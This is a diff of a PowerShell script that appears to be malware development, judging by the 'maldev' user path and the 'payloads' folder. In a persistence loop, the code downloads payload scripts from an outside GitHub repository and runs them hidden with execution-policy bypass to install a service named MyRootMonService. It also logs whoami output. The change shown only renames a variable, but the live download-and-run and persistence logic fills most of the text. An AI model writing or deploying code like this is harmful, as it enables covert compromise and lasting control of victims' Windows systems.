@@ -10,7 +10,7 @@ $paths = @(
     "$env:windir\System32\LogFiles\WMI"
 )
 Start-Process powershell.exe -ArgumentList "-Command `"whoami >> C:\whoami.txt`""
-$basePath = $basePath -replace '([{}])', '`$1'
+$b = $basePath -replace '([{}])', '`$1'
 echo $basePath >> "C:\Users\maldev\Downloads\root_mon_mon.txt"
 
 $serviceName = "MyRootMonService"
@@ -77,12 +77,12 @@ while($true){
         }
         iwr -Uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/root_mon.ps1" -OutFile $rootMonScript
         iwr -Uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/init_service_rootmon.ps1" -OutFile $initServiceRootmonPath
-        powershell.exe -ep bypass -noP -w hidden $initServiceRootmonPath -rootPath $rootPath -scriptPath $rootMonScript -basePath "$basePath"
+        powershell.exe -ep bypass -noP -w hidden $initServiceRootmonPath -rootPath $rootPath -scriptPath $rootMonScript -basePath "$b"
     }
     
     elseif($r -or $n){
         iwr -Uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/init_service_rootmon.ps1" -OutFile $initServiceRootmonPath
-        powershell.exe -ep bypass -noP -w hidden $initServiceRootmonPath -rootPath $rootPath -scriptPath $rootMonScript -basePath "$basePath"
+        powershell.exe -ep bypass -noP -w hidden $initServiceRootmonPath -rootPath $rootPath -scriptPath $rootMonScript -basePath "$b"
     }
     $issetup = $false
 }
